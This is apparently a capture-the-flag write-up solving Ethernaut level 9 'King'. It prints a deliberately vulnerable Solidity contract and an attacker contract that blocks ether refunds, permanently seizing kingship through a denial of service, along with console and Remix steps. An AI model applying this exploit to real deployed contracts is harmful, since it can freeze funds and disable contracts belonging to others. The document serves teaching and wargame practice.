# Level 9: King

This is the level 9 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- Solidity contract [receive](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function
- [transfer](https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses) method of addresses

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

`player` has to prevent the current level from reclaiming the kingship after instance is submitted.

Kingship is switched in `receive` function i.e. when a specific value is sent to `King`. So, we'll have to somehow prevent execution of `receive`.

The key thing to notice is that previous `king` is sent back `msg.value` using `transfer`. But what if this previous `king` was a contract and it didn't implement any `receive` or `fallback`? It won't be able to receive any value. And because of this `transfer` stops execution with an exception (unlike `send`). Gotcha!

Let's make a contract `ForeverKing` that has NO `receive` or `fallback`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForeverKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }
}
```

Query the current prize:

```javascript
await contract.prize().then(v => v.toString())

// Output: '1000000000000000'
```

So at least `1000000000000000` wei is required to claim kingship.

Get your instance's address, so that `ForeverKing` can send value to it:

```javascript
contract.address

// Output: <your-instance-address>
```

Call `claimKingship` of `ForeverKing` with param `<your-instance-address>` and set the amount `1000000000000000` wei as value in Remix. That will make `ForeverKing` contract as king.

Submit the instance. Upon submitting the level will try to reclaim kingship through `receive` fallback. However, it will fail.

This is because upon reaching line:
```
king.transfer(msg.value);
```
exception would occur because `king` (i.e. deployed `ForeverKing` contract) has no fallback functions.

Level cleared.

Bonus thing to note here is that in `ForeverKing`'s `claimKingship`, `call` is used specifically. `transfer` or `send` will fail because of limited 2300 gas stipend. `receive` of `King` would require more than 2300 gas to execute successfully.

Of course, there are probably other ways too to prevent a successful `receive` execution.

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
